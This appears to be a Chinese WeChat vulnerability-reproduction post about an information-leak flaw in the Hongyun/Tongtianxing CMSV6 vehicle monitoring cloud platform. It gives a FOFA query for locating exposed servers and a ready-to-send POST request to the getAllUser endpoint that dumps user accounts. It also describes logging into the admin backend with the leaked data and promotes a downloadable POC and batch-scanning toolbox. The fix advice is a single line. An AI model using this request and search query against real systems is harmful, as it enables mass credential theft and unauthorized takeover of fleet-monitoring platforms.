#  鸿运(通天星CMSV6车载)主动安全监控云平台存在敏感信息泄露漏洞 附POC软件   
南风徐来  南风漏洞复现文库   2024-02-26 20:42  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 鸿运(通天星CMSV6车载)主动安全监控云平台简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
鸿运(通天星CMSV6车载)主动安全监控云平台实现对计算资源、存储资源、网络资源、云应用服务进行7*24小时全时区、多地域、全方位、立体式、智能化的IT运维监控，保障IT系统安全、稳定、可靠运行。  
## 2.漏洞描述  
  
鸿运主动安全监控云平台实现对计算资源、存储资源、网络资源、云应用服务进行7*24小时全时区、多地域、全方位、立体式、智能化的IT运维监控，保障IT系统安全、稳定、可靠运行。鸿运(通天星CMSV6车载)主动安全监控云平台存在敏感信息泄露漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
鸿运(通天星CMSV6车载)主动安全监控云平台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZCliabRPDu7FQqNFvbsa6wz3V9ZqqVicb4iasrthZoic8vP70ATIRJvJy9RXcKibc2NH1HEbabMd46iaDw/640?wx_fmt=jpeg&from=appmsg "null")  
  
鸿运(通天星CMSV6车载)主动安全监控云平台存在敏感信息泄露漏洞  
## 4.fofa查询语句  
  
body="./open/webApi.html"||body="/808gps/"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/808gps/StandardLoginAction_getAllUser.action  
  
漏洞数据包：  
```
POST /808gps/StandardLoginAction_getAllUser.action HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Content-Length: 9
Content-Type: application/x-www-form-urlencoded

json=null
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZCliabRPDu7FQqNFvbsa6wzdddkXp7oUwqaDxPaBQ4iafGB7ibtdsw7W66dXZPVyJlnVA0WvKHQibicicg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
利用泄露的信息登录后台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZCliabRPDu7FQqNFvbsa6wzu1c0x6OZW1NActClpr5SicrZVibz0DwngD3qsHOpPia1lD3sUDhK5pnpg/640?wx_fmt=jpeg&from=appmsg "")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现106 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZCliabRPDu7FQqNFvbsa6wzxiaIZQneD86zHMm34a59Ocv4rIQVWjfKxhcITbUB0jv5CyhczmCgw5w/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZCliabRPDu7FQqNFvbsa6wzzIOFnXBEHg6CRB1btlJFKE5UFfHl6zKhEaTzJrTgzUPvbaWkPqMewA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZCliabRPDu7FQqNFvbsa6wzicvRribK2lJjbZglHVMERxIderEoO0Mf8GhUb55w12V2kOicR64HYXblw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZCliabRPDu7FQqNFvbsa6wzMiaiaibGf8JnqXdtYRh70QrfhcOFv08ehriapQ9V95qIoM8oibVHJsaEsIw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZCliabRPDu7FQqNFvbsa6wzlGqaU05Mp4UBoAZrB7xs4aJA2htKzg09ib4uZz3J4T1ZB4j0uuRZiaeg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZCliabRPDu7FQqNFvbsa6wzYxNTgHVaicykm299iasZbeGTS4jkquQlkt8SLQL6j0iaTahIJicPibkTY8w/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请联系厂商打补丁或者升级到最新版本。  
## 8.往期回顾  
  
[万户协同办公平台ezoffice text2Html接口存在任意文件读取漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485391&idx=1&sn=aa5d5dbff3236275de3b833f3fbb352e&chksm=974b8ac8a03c03debc66056e045e86f4eabc31b7df299b878ce87cc5a390afac0115416caea6&scene=21#wechat_redirect)  
  
  
[Edusoho网络课堂cms存在任意文件读取漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485379&idx=1&sn=cad3f569bd587a121cc02e29c1307a9e&chksm=974b8ac4a03c03d22e87ff77fe6efdd4d92264c555627fec752cde1c8ea4cc46f2b255088ec0&scene=21#wechat_redirect)  
  
  
  
  
